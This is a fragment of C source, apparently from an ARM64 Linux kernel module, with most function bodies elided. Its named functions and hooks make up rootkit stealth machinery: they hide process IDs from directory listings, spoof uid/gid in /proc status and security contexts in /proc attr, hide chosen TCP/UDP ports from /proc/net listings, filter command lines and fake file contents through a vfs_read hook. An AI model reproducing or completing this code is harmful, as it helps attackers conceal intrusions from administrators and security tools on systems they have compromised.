...
static struct _nvk_pid_actor_slot
	_nvk_pid_actors[_NVK_PID_ACTOR_SLOTS];

static int _nvk_pid_actor_acquire(nvk_filldir_fn orig)
{
	unsigned long self;
...
static void _nvk_pid_actor_release(void)
{
	unsigned long self;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
	int i;
...
static nvk_filldir_fn _nvk_pid_actor_get_orig(void)
{
	unsigned long self;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
	int i;
...
static struct nvk_hook _nvk_proc_status_hook;
static nvk_proc_status_show_fn _nvk_orig_proc_status;
static int _nvk_proc_status_hooked;

static u32 _nvk_status_spoof_uid = 0xFFFFFFFFU;
static u32 _nvk_status_spoof_gid = 0xFFFFFFFFU;

typedef int (*nvk_seq_printf_fn)(void *seq, const char *fmt, ...);
static nvk_seq_printf_fn _nvk_seq_printf_fn;

static void _nvk_status_ctx_handler(nvk_reg_ctx *ctx)
{
	(void)ctx;
}

static int nvk_proc_status_filter_install(u32 fake_uid, u32 fake_gid)
{
	void *target;
...
static void nvk_proc_status_filter_cleanup(void)
{
...
typedef long (*nvk_proc_attr_read_fn)(void *file, char __user *buf,
				      size_t count, long long *ppos);
static struct nvk_hook _nvk_proc_attr_hook;
static nvk_proc_attr_read_fn _nvk_orig_proc_attr_read;
static int _nvk_proc_attr_hooked;

static const char *_nvk_attr_fake_ctx;

static long _nvk_proc_attr_read_filter(void *file, char __user *buf,
					size_t count, long long *ppos)
{
	long ret;
...
static int nvk_proc_attr_filter_install(const char *fake_context)
{
	void *target;
...
static void nvk_proc_attr_filter_cleanup(void)
{
...
static struct nvk_net_hide_state _nvk_net_hide;

typedef int (*nvk_net_seq_show_fn)(void *seq, void *v);
static nvk_net_seq_show_fn _nvk_orig_tcp4_show;
static nvk_net_seq_show_fn _nvk_orig_tcp6_show;
static nvk_net_seq_show_fn _nvk_orig_udp4_show;
static nvk_net_seq_show_fn _nvk_orig_udp6_show;

static int nvk_net_hide_add_port(u16 port)
{
...
static int _nvk_net_port_hidden(u16 port)
{
	int i;
...
static int _nvk_extract_ports(void *sk, u16 *sport, u16 *dport)
{
	if (!sk) return -1;
...
static int _nvk_net_filter_show(void *seq, void *v,
...
static int _nvk_tcp4_show_filter(void *seq, void *v)
{ return _nvk_net_filter_show(seq, v, _nvk_orig_tcp4_show); }

static int _nvk_tcp6_show_filter(void *seq, void *v)
{ return _nvk_net_filter_show(seq, v, _nvk_orig_tcp6_show); }

static int _nvk_udp4_show_filter(void *seq, void *v)
{ return _nvk_net_filter_show(seq, v, _nvk_orig_udp4_show); }

static int _nvk_udp6_show_filter(void *seq, void *v)
{ return _nvk_net_filter_show(seq, v, _nvk_orig_udp6_show); }

static int nvk_net_hide_install(void)
{
	void *target;
...
static void nvk_net_hide_cleanup(void)
{
...
typedef long (*nvk_cmdline_read_fn)(void *file, char __user *buf,
				    size_t count, long long *ppos);
static struct nvk_hook _nvk_cmdline_hook;
static nvk_cmdline_read_fn _nvk_orig_cmdline_read;
static int _nvk_cmdline_hooked;

#define NVK_CMDLINE_FILTER_MAX 4
#define NVK_CMDLINE_FILTER_LEN 32

static char _nvk_cmdline_filters[NVK_CMDLINE_FILTER_MAX][NVK_CMDLINE_FILTER_LEN];
static int _nvk_cmdline_filter_cnt;

static int nvk_cmdline_filter_add(const char *keyword)
{
...
static long _nvk_cmdline_read_filter(void *file, char __user *buf,
				     size_t count, long long *ppos)
{
	long ret;
...
static int nvk_cmdline_filter_install(void)
{
	void *target;
...
static void nvk_cmdline_filter_cleanup(void)
{
...
static struct nvk_hook _nvk_vfs_read_hook;
static nvk_vfs_read_fn _nvk_orig_vfs_read;
static int _nvk_vfs_read_hooked;
...
static struct nvk_file_spoof_entry _nvk_file_spoofs[NVK_FILE_SPOOF_MAX];
static int _nvk_file_spoof_cnt;

static int nvk_file_spoof_add(const char *path,
...
static int _nvk_file_match_path(void *file, const char *target)
{
...
static long _nvk_vfs_read_filter(void *file, char __user *buf,
				 size_t count, long long *pos)
{
	long ret;
...
static int nvk_file_spoof_install(void)
{
	void *target;
...
static void nvk_file_spoof_cleanup(void)
{
